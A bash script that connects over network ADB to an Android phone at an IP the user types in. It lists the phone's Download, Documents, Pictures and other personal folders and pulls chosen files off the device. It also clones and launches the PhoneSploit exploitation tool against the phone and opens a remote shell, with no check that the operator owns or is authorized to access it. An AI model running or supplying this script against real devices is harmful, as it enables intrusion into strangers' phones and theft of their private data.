#!/bin/bash

echo "=== Advanced Android ADB Automation Script ==="

# Check if adb is installed
if ! command -v adb &> /dev/null; then
  echo "[*] adb not found. Installing..."
  sudo apt-get update && sudo apt-get install adb -y
else
  echo "[*] adb is installed."
fi

# Prompt for Android device IP
read -p "Enter Android device IP (e.g. 192.168.1.10): " DEVICE_IP

echo "[*] Connecting to $DEVICE_IP..."
adb connect "$DEVICE_IP:5555"

# Verify connection
if adb devices | grep -q "$DEVICE_IP:5555"; then
  echo "[+] Successfully connected to $DEVICE_IP"
else
  echo "[-] Failed to connect to $DEVICE_IP. Exiting."
  exit 1
fi

# List devices
echo "[*] Connected devices:"
adb devices -l

# Auto scan common directories for files
COMMON_DIRS=("/sdcard/Download" "/sdcard/Documents" "/sdcard/Pictures" "/sdcard/Music" "/sdcard/Movies")

echo "[*] Scanning common directories for files on device:"
for dir in "${COMMON_DIRS[@]}"; do
  echo "Listing files in $dir ..."
  adb -s "$DEVICE_IP:5555" shell "ls -l $dir" || echo "[!] Could not access $dir"
  echo "-----------------------------"
done

# Pull files interactively
while true; do
  read -p "Do you want to pull a file from device? (y/n): " PULL_CHOICE
  if [[ "$PULL_CHOICE" =~ ^[Yy]$ ]]; then
    read -p "Enter full path of file on device (e.g. /sdcard/Download/secret.txt): " FILE_PATH
    read -p "Enter local destination directory (e.g. ~/Desktop): " LOCAL_DIR
    mkdir -p "$LOCAL_DIR"
    echo "[*] Pulling $FILE_PATH to $LOCAL_DIR"
    adb -s "$DEVICE_IP:5555" pull "$FILE_PATH" "$LOCAL_DIR" && echo "[+] File pulled successfully." || echo "[-] Failed to pull file."
  else
    break
  fi
done

# PhoneSploit integration
read -p "Do you want to launch PhoneSploit shell on device? (y/n): " PHONESPLOIT_CHOICE
if [[ "$PHONESPLOIT_CHOICE" =~ ^[Yy]$ ]]; then
  # Check if python3 and git are installed
  if ! command -v python3 &> /dev/null || ! command -v git &> /dev/null; then
    echo "[!] Please install python3 and git to run PhoneSploit."
    exit 1
  fi

  # Clone PhoneSploit if not present
  if [ ! -d "PhoneSploit" ]; then
    echo "[*] Cloning PhoneSploit repo..."
    git clone https://github.com/aerosol-can/PhoneSploit.git
  fi

  cd PhoneSploit || { echo "[-] Could not enter PhoneSploit directory"; exit 1; }

  # Install dependencies
  pip3 install -r requirements.txt || echo "[!] Could not install all dependencies."

  echo "[*] Launching PhoneSploit..."
  python3 phonesploit.py "$DEVICE_IP"

  cd ..
fi

# Optionally open direct adb shell
read -p "Open direct adb shell on device? (y/n): " OPEN_SHELL
if [[ "$OPEN_SHELL" =~ ^[Yy]$ ]]; then
  adb -s "$DEVICE_IP:5555" shell
fi

echo "=== Script completed ==="
